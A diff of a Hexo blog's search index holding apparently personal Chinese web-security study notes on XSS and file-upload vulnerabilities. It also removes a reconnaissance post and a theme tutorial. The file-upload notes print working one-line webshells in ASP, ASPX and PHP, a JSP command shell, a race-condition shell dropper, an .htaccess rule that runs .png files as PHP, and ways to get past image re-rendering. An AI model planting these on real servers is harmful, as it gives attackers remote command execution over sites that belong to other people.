@@ -19,95 +19,22 @@
 ]]></content>
   </entry>
   <entry>
-    <title>网络安全学习之信息收集</title>
-    <url>/posts/45922.html</url>
-    <content><![CDATA[<h3 id="渗透的本质就是信息收集"><a href="#渗透的本质就是信息收集" class="headerlink" title="渗透的本质就是信息收集"></a>渗透的本质就是信息收集</h3><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
-<li>信息收集是渗透测试的第一阶段，利用传统的搜索引擎，物联网引擎或直接使用本地工具对目标进行操作系统探测、端口扫描、Web目录扫描、Web指纹识别等，收集的信息越多渗透测试的成功率越高。“渗透的本质就是信息收集”</li>
-<li>分类：信息收集分为主动和被动<br>主动：直接访问、扫描网站这种将流量流经网站的行为<br>被动：利用第三方暴露在外，主要是互联网的信息进行收集</li>
+    <title>网络安全之XSS</title>
+    <url>/posts/3909557445.html</url>
+    <content><![CDATA[<h3 id="针对HTML的注入"><a href="#针对HTML的注入" class="headerlink" title="针对HTML的注入"></a>针对HTML的注入</h3><h2 id="XSS简介："><a href="#XSS简介：" class="headerlink" title="XSS简介："></a>XSS简介：</h2><ul>
+<li>XSS全称叫做跨站脚本（Cross-Site Scripting）攻击，是一种代码注入攻击，往网页中插入恶意的JS脚本<br>比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert(document.cookie)</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><ul>
-<li>“+”强制包含某个关键字符进行查询<br>“-”查询的时候忽略某个字符<br>“*”匹配任意字符进行查询<br>“site”指定域名进行查询<br>“intext”正文中存在关键词的网页<br>“intitle”标题中存在关键词的网页<br>“inurl”URL中存在关键词的网页<br>“filetype”搜索指定文件类型</li>
-<li>查找文件上传点<br>inurl:admin&#x2F;upfile.asp<br>inurl:admin&#x2F;upload.asp<br>inurl:RichWidgets&#x2F;Popup_Upload.aspx  </li>
-<li>查找目录遍历站点<br>intitle：”index of”  </li>
-<li>寻找存在注入的PHP站点<br>inurl:”.php?id&#x3D;” “You have an error in your SQL syntax”</li>
-<li>寻找网站后台<br>intitle:后台登陆<br>inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms<br>inrtl:houtai.php|houtai.asp<br>intext:管理|后台|登录|用户名|密码|系统|账号<br><a href="https://www.exploit-db.com/google-hacking-database">https:www.exploit-db.com/google-hacking-database</a></li>
+<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射性XSS（非持久型）"><a href="#反射性XSS（非持久型）" class="headerlink" title="反射性XSS（非持久型）"></a>反射性XSS（非持久型）</h3><ul>
+<li>反射性跨站脚本也称非持久型，参数行跨站脚本。反射性XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说黑客往往需要诱使用户“点击”一个恶意软件，才能攻击成功。<br>假设一个页面把用户输入的参数直接输出到页面上：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$input = $_GET[&#x27;param&#x27;];</span><br><span class="line">echo &quot;&lt;h1&gt;&quot;.$input.&quot;&lt;/h1&gt;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+用户向param提交的数据会在<h1>的标签中展示出来<br><img src="/posts/3909557445/1.png"></h1></li>
 </ul>
-<h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><ul>
-<li>Shodan.io<br>指定语法：<br>net:搜索指定ip地址或子网，c段<br>hostname:搜索指定的域名或服务器<br>port:搜索开放指定端口的设备<br>org:搜索指定公司或组织的设备<br>product：搜索运行指定产品或软件操系统的设备<br>version：指定软件的版本<br>isp：搜索指定isp供应商的设备<br>country：搜索指定国家的设备<br>city：搜索指定城市的设备</li>
-<li>fofa.so</li>
+<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><ul>
+<li>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存、还是文件系统等），下次请求目标页面时，不用再提交XSS代码。<br>最典型的例子是留言板XSS<br>存储型XSS的攻击是最隐蔽的也是为还比较大的，普通用户看到的代码是正常的，担当用户查看留言版的时候，那些流言会从数据库中查询出来并显示，浏览器发现有XSS代码，就当作正常的HTML与JS解析执行，于是就出发了XSS攻击。</li>
 </ul>
-<h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
-<li>&lt;phpinfo.me&gt;</li>
-</ul>
-<h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与旁站</h2><ul>
-<li>C段<br>192.168.1.1&#x2F;24<br>192.168.1.1-192.168.1.255<br>B段<br>172.1.1.1&#x2F;16<br>172.1.1.1-172.1.1.255<br>A段<br>10.1.1.1-10.255.255.255<br>一般渗透测试对C段锦兴扫描，内网中会对B段进行探测扫描<br>必应，爱站，Fofa(获取到域名的IP地址后，可以反查域名)<br>内网：HTTPScan</li>
-</ul>
-<h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul>
-<li>CDN，将源站的内容发布到接近用户的网络边缘，用户可以就近获取数据，不仅降低了网络的拥塞情况、提高请求的响应速度，也能够减少源站的负载压力  </li>
-<li>ping命令<br>直接ping查询地址信息：ping.xxx.com可能得到其真实IP  </li>
-<li>nslookup查询<br>域名解析结果为多个ip，多半使用了CDN，是不真实的ip  </li>
-<li>超级ping<br>爱站超级ping  </li>
-<li>解析历史记录查询<br>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip  </li>
-<li>子域名绕过<br>很多网站的主站的访问大，主站挂CDN，分站不一定，结合之前的子域名爆破来进行收集  </li>
-<li>利用站点功能主动发起请求<br>一些网站提供注册服务，可能服务器本身自带sendmail可以直接发送邮件，通过邮件发送往往也能得到到服务器IP  </li>
-<li>利用网站漏洞<br>如果目标站点存在漏洞，如phpinfo敏感信息泄露，Struts2、网页源代码泄露、svn信息泄露、Github信息泄露<br>若存在Web泄露，服务器主动与我们发起请求连接，我们也能获取目标站点真实IP，例如xss等  </li>
-<li>国外访问</li>
-</ul>
-<h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><ul>
-<li>whois查询<br>whois.bugscaner.com<br>whois.aizhan.com<br>whois.chinaz.com  </li>
-<li>注册网站查询<br><a href="http://www.reg007.com/">www.reg007.com</a><br>inurl:t.me社工库<br>密码泄露查询：haveibeenpwned.com<br>国家职业资格证查询<br>身份证查询：http&#x2F;&#x2F;w<a href="http://www.2cha.com/">www.2cha.com</a><br>经纬度查询：http:&#x2F;<a href="http://www.gpsspg.com/maps.htm">www.gpsspg.com/maps.htm</a><br>微信搜索：http:&#x2F;weixin.sougou.com<br>Github信息收集</li>
-</ul>
-<h2 id="Nmap与Masscan"><a href="#Nmap与Masscan" class="headerlink" title="Nmap与Masscan"></a>Nmap与Masscan</h2><ul>
-<li>Nmap：网络映射器，一个开源端口扫描器，可以扫描大型网络也可以扫描单个主机<br>端口扫描是指人为发送一组端口扫描信息试图以了解某台计算机的弱点并了解其提供的计算机网络服务类型。  </li>
-<li>端口状态：<br>open对外开放<br>close对外关闭<br>Fitered无法判断被防火墙设备拦截过滤<br>Unfitered未被过滤，使用ACK扫描才可能出现这种情况<br>open\Fitered不能确定开放还是被过滤<br>close\Fitered不能确定关闭还是被过滤  </li>
-<li>主机发现：<br>-sP:ping扫描<br>-P0&#x2F;Pn:无ping扫描<br>-Ps：TCP SYN Ping扫描<br>-PA：TCP ACK ping扫描<br>-PU：UDP Ping扫描<br>-PE&#x2F;PP&#x2F;PM:ICMP Ping Types扫描<br>-PR:ARP Ping扫描<br>-sL：列表扫描<br>-6：扫描IPv6地址<br>–traceroute：路由跟踪<br>-PY：SCTP INIT Ping扫描  </li>
-<li>指纹探测<br>-sV：版本探测<br>-A：更加详细直观的扫描<br>–version-intensity：设置扫描强度1~9默认为7<br>–version-light：轻量级扫描，默认值为2<br>–version-all：重量级扫描，强度为9<br>-O：启动操作系统扫描  </li>
-<li>时间模板<br>-T0：非常慢，用于IDS躲避<br>-T1：缓慢的扫描，用于IDS躲避<br>-T2：降低了扫描速度，以使用更少的带宽和目标主机资源<br>-T3：默认模式，根据目标的反应自动调整时间<br>-T4：假设用户具有可靠的网络从而加速扫描<br>-T5：急速扫描，为了获得速度而牺牲准确性  </li>
-<li>TCP SYN扫描：<br>较常用的扫描方式，被称为半开放扫描，速度快，较隐蔽</li>
-</ul>
-<h2 id="提取指纹信息"><a href="#提取指纹信息" class="headerlink" title="提取指纹信息"></a>提取指纹信息</h2><ul>
-<li>返回包直接提取指纹信息  </li>
-<li>网站源码指纹提取指纹信息  </li>
-<li>指定文件的MD5值校验</li>
+<h3 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h3><ul>
+<li>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。他和反射型XSS和存储型XSS的差别在于DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器的DOM解析，可以认为完全就是客户端的事。</li>
 </ul>
 ]]></content>
-  </entry>
-  <entry>
-    <title>网络安全学习之文件上传</title>
-    <url>/posts/2682.html</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
-<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
-<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
-<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
-<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
-<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
-<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
-</ul>
-<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
-<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
-<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
-<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
-<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
-</ul>
-<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
-<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
-<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
-<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
-<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
-<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
-<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
-<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h2><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2>]]></content>
   </entry>
   <entry>
     <title>网络安全学习之密码爆破</title>
@@ -152,40 +79,41 @@
 ]]></content>
   </entry>
   <entry>
-    <title>hexo修改主题</title>
-    <url>/posts/38893.html</url>
-    <content><![CDATA[<ul>
-<li>默认主题千篇一律，要想有自己的东西，就要和别人不一样，所以搭建好自己的博客，当然要按照自己的喜好来布置主题啦</li>
+    <title>网络安全学习之文件上传</title>
+    <url>/posts/2682.html</url>
+    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><ul>
+<li>简介：现代互联网的Web应用程序中，上传文件是一种常见的功能，因为它有助于提高业务效率，如果Web应用存在文件上传漏洞，那么恶意用户就可以利用文件上传漏洞将可执行脚本程序（WebShell）上传到服务器中，获得网站的权限，然后可以进一步对服务器进行入侵，扩大控制权限。  </li>
+<li>漏洞产生原因：<br>上传文件时，如果服务器端没有对客户端上传的文件进行严格的检验或过滤，就容易造成可上传任意文件的情况，包括上传脚本文件（asp，aspx，php，jsp）  </li>
+<li>漏洞的危害：<br>非法用户可以利用上传的脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被称为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</li>
+<li>ASP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;x&quot;</span>)%&gt;//密码是‘x’</span><br><span class="line">&lt;%execute request(<span class="string">&quot;x&quot;</span>)%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>ASPX  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;&lt;%<span class="built_in">eval</span>(Request.Item[<span class="string">&quot;x&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>PHP  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>])?&gt;  //比较标准的用法；不一定是post，也可以是get</span><br><span class="line">&lt;?php assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>];?)&gt;  //php版本&gt;7时不能用了</span><br></pre></td></tr></table></figure></li>
+<li>JSP CMD WebShall  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%  </span><br><span class="line">    if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;)))</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInp</span><br><span class="line">        int a=-1;</span><br><span class="line">        byte[] b=new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)</span><br><span class="line">        &#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></li>
+<li>文件上传漏洞的条件<br>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法使得Web容器解释这个脚本，那么也就不能被称之为漏洞<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，也可能导致攻击不成功  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br><span class="line">&lt;?php eval($_GET[1]);?&gt;</span><br><span class="line">?1=system(whoami);</span><br><span class="line">&lt;?php eval(system(whoami););?&gt;</span><br><span class="line">$_GET=&gt;接受GET参数</span><br><span class="line">$_POST=&gt;接受POST参数</span><br><span class="line">$_REQUEST=&gt;接受GET参数 POST Cookie 参数</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
-<h2 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h2><ul>
-<li>找到主题的下载链接,例如：<a href="https://github.com/Fechin/hexo-theme-diaspora.git">https://github.com/Fechin/hexo-theme-diaspora.git</a> themes&#x2F;diaspora，然后在gitbash中输入<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/Fechin/hexo-theme-diaspora.git themes/diaspora</span><br></pre></td></tr></table></figure></li>
+<h2 id="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"><a href="#中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval" class="headerlink" title="中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval"></a>中国蚁剑antsword使用的是POST接受参数，PHP木马使用的eval</h2><h2 id="文件头绕过："><a href="#文件头绕过：" class="headerlink" title="文件头绕过："></a>文件头绕过：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JPEG(jpg), 文件头：FFD8FF</span><br><span class="line">PNG(png), 文件头：89504E47</span><br><span class="line">GIF(gig), 文件头：47494638</span><br><span class="line">HTML(html), 文件头：68746D6C3E</span><br><span class="line">ZIP Archive(Zip), 文件头：504B0304</span><br><span class="line">RAR Achive(rar), 文件头：52617221</span><br><span class="line">Adobe Acrobat(pdf), 文件头：255044462D312E</span><br><span class="line">MS Word/Excel(xls.or.doc), 文件头：D0CF11E0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>白名单策略：只允许上传xxx后缀  jpg jpeg png gif<br>黑名单策略：不允许上传xxx后缀<br>白名单是设置能通过用户，黑名单是设置不能通过用户，所以一般情况下，白名单比黑名单限制的用户多些</li>
 </ul>
-<h2 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h2><ul>
-<li>修改Hexo配置文件_config.yml主题设置为diaspora<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">theme:diaspora//注意，在这里的主题名要与themes文件夹中的主题文件名一致</span><br></pre></td></tr></table></figure></li>
+<h2 id="htaccess："><a href="#htaccess：" class="headerlink" title=".htaccess："></a>.htaccess：</h2><ul>
+<li>是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向，自定义404错误页面，改变文件扩展名，允许&#x2F;组织特定的用户或目录的访问，禁止默认列表，配置默认文档等功能。</li>
+<li>grep -r “application&#x2F;x-httpd-php” &#x2F;etc<br>手动查询etc目录下包含”application&#x2F;x-httpd-php”的文件  </li>
+<li>htaccess解析规则<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat .htaccess</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure></li>
+<li>PHP内核是由C语言实现的，所以使用了C语言中一些字符串处理函数，比如在连接字符串的时候，0字节（\x00）将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串<br>00 截断常配合目录截断</li>
 </ul>
-<h2 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h2><ul>
-<li>注意：在更新主题时备份_config.yml配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> themes/diaspora</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></li>
+<h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><ul>
+<li>简介 ：是一个系统的运行结果不受控制时间的先后顺序。当这些不受控制的事件没有按照开发者想要的方式运行的时候，就可能出现bug，尤其在当我们的系统中大量对资源进行共享，，如果处理不当就会产生条件竞争漏洞。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除他的间隙，攻击者通过不断的发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意的shell文件，至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把他删除的问题就已经不重要了，因为攻击者已经成功地在服务器中植入了一个shell文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命等待有缘人的光顾，然后快速生成一个小webshell。这类WebShell大体内容如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;xiao,php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php eval($_REQUEST(1));?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="创建一个分类页面"><a href="#创建一个分类页面" class="headerlink" title="创建一个分类页面"></a>创建一个分类页面</h2><ul>
-<li>新建一个页面，命名为categories。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面的类型设置为categories<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br></pre></td></tr></table></figure></li>
+<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><ul>
+<li>原理：上传文件后，网站会对图片进行二次处理(格式、尺寸、要求等)，服务器会把里面的内容进行替换和更新。处理完成后，根据原有的图片生成一个新的图片并放到网站对应的标签进行显示。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$im = imagecreatefromjpeg( $upload_file);</span><br><span class="line">$im = imagecreatefrompng( $upload_file);</span><br><span class="line">$im = imagecreatefromgif( $upload_file);</span><br></pre></td></tr></table></figure></li>
+<li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li>
+<li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者IDAT 数据块</li>
+<li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试渲染两次会返回正确木马</li>
+<li>JPG坑点总结<br>需要被imagecreatefromjpeg渲染或再用工具<br>图片找的稍微大一点成功率更高<br>Payload语句越短成功率越高<br>一张图片不行就换一张不要死磕  </li>
+<li>国光补充:貌似白色的图片成功率也比较高<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $_GET[0]($_POST[1]);?&gt; 这种payload成功率很高</span><br></pre></td></tr></table></figure></li>
 </ul>
-<h2 id="创建标签页"><a href="#创建标签页" class="headerlink" title="创建标签页"></a>创建标签页</h2><ul>
-<li>新建一个页面，命名为tags。命令如下：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure></li>
-<li>编辑刚新建的页面，将页面设置为tags<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="创建搜索页"><a href="#创建搜索页" class="headerlink" title="创建搜索页"></a>创建搜索页</h2><ul>
-<li>需要安装hexo的搜索插件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure></li>
-<li>安装完成后输入以下命令查看安装情况<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm <span class="built_in">ls</span> --depth 0//一般不需要，因为正常情况不会出现安装失败</span><br></pre></td></tr></table></figure></li>
